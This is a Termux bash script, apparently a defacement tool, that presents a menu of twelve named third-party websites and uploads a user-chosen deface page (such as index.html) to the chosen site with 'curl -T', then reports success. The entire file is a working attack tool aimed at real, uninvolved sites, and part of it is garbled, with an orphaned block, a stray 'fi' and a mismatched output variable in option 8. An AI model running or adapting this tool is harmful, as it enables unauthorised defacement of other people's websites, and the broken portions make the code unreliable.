#warna
blue="\033[34;1m"
green="\033[32;1m"
purple="\033[35;1m"
cyan="\033[36;1m"
red="\033[31;1m"
putih="\033[97;1m"
kuning="\033[93;1m"
#web
pa="http://uzingela.co.za"
pu="http://www.mta-sts.fw2a.liquidchefsworld.com"
pe="http://mta-sts.fw1a.liquidchefs.biz"
pt="http://mta-sts.fw1a.liquidchefs.mobi"
pk="http://www.stitchaccounting.co.za"
pl="http://www.n8tive.co.za"
i="http://www.nhsgilde.co.za"
yo="http://www.ticadesign.co.za"
ko="http://mariongeiger.com"
ha="http://sgsfreight.com"
ye="http://toshibafs.com"
ho="http://decision-intel.com"

#Buat Tanya Login Lagi Apa Enggak
menu() {
read -p "Deface Lagi Gak Tod? (Y/N)" lgi
if [ $lgi = y ] || [ $lgi = Y ]
then
bash deface.sh
fi
if [ $lgi = n ] || [ $lgi = N ]
then
exit
fi
}
termux-setup-storage
clear
 
neofetch --ascii_distro garuda 
echo ""
echo -e $red"               •"$kuning"•"$green"•"$putih"Coded By Pick Ford"$green"•"$kuning"•"$red"•"$putih 
echo -e $kuning'•'$putih'───────────────────────────────────────────────────────'$kuning'•'
echo
echo -e $putih'Github    '$red':'$putih'https://github.com/PICKFORD-DC'
echo -e $putih'Facebook  '$red':'$putih'https://www.facebook.com/profile.php?id=100077142458119 '
echo -e $putih'Whatsapp  '$red':'$putih'Kepo kon'
echo ""
echo -e $kuning'•'$putih'───────────────────────────────────────────────────────'$kuning'•'
echo ""
echo -e $blue'           DONT FORGET' $red'SUBSCRIBE' $blue'AMMAR EXECUTED'
echo ""
echo ""
echo -e $putih"["$green'•'$putih'] 1. http://uzingela.co.za'
echo -e "["$green"•"$putih"] 2. http://www.mta-sts.fw2a.liquidchefsworld.com" 
echo -e "["$green"•"$putih"] 3. http://mta-sts.fw1a.liquidchefs.biz" 
echo -e "["$green"•"$putih"] 4. http://mta-sts.fw1a.liquidchefs.mobi" 
echo -e "["$green"•"$putih"] 5. http://www.stitchaccounting.co.za" 
echo -e "["$green"•"$putih"] 6. http://www.n8tive.co.za" 
echo -e "["$green"•"$putih"] 7. http://www.nhsgilde.co.za" 
echo -e "["$green"•"$putih"] 8. http://www.ticadesign.co.za"
echo -e "["$green"•"$putih"] 9. http://mariongeiger.com"
echo -e "["$green"•"$putih"] 10. http://sgsfreight.com"
echo -e "["$green"•"$putih"] 11. http://toshibafs.com"
echo -e "["$green"•"$putih"] 12. http://decision-intel.com"
echo -e "["$green"•"$putih"] 13. BUAT SCRIPT DEFACE SENDIRI" '['$green'Kalo Lu Blum Punya Script Pilih Ini Dulu'$putih']' 
echo 
read -p "Pilih No Berapa Tod: " Next;  
if [ $Next = 1 ] || [ $Next = satu ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pa 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY >'$purple $pa/$sc 
menu 
fi 
if [ $Next = 2 ] || [ $Next = dua ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pu 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $pu/$sc 
menu 
fi 
if [ $Next = 3 ] || [ $Next = tiga ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pe 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $pe/$sc 
menu 
fi 
if [ $Next = 4 ] || [ $Next = empat ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pt 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $pt/$sc 
menu 
fi 
if [ $Next = 5 ] || [ $Next = lima ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pk 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $pk/$sc 
menu 
fi 
if [ $Next = 6 ] || [ $Next = enam ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $pl 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $pl/$sc 
menu 
fi 
if [ $Next = 7 ] || [ $Next = tujuh ] 
then 
echo 
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard' 
echo -e $red'contoh : index.html' 
read -p "Input File: " sc; 
curl -T /sdcard/$sc $i 
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $i/$sc 
menu 
fi

echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'contoh : index.html'
read -p "Input File: " sc;
curl -T /sdcard/$sc $yo
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $yo/$sc
menu
fi
if [ $Next = 8 ] || [ $Next = delapan ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'                                                                                   echo -e $red'contoh : index.html'
read -p "Input File: " sc;
curl -T /sdcard/$sc $yo                                                                                                                      echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $pu/$sc
menu
fi
if [ $Next = 9 ] || [ $Next = sembilan ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'contoh : index.html'
read -p "Input File: " sc;
curl -T /sdcard/$sc $ko
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $ko/$sc
menu
fi
if [ $Next = 10 ] || [ $Next = sepuluh ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'contoh : index.html'
read -p "Input File: " sc;
curl -T /sdcard/$sc $ha
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $ha/$sc
menu
fi
if [ $Next = 11 ] || [ $Next = sebelas ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'contoh : index.html'
read -p "Input File: " sc;
curl -T /sdcard/$sc $ye
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $ye/$sc
menu
fi
if [ $Next = 12 ] || [ $Next = duabelas ]
then
echo
echo -e $green' [!]'$yellow'Script Harus Berada Di sdcard'
echo -e $red'contoh : index.html'
read -p "Input File: " sc;
curl -T /sdcard/$sc $ho
echo -e $cyan' ['$green'•'$cyan'] '$kuning'SUCCESFULLY > '$purple $ho/$sc
menu
fi

if [ $Next = 13 ] || [ $Next = tigabelas ] 
then 
cd Data
bash create_enc.sh
menu 
fi
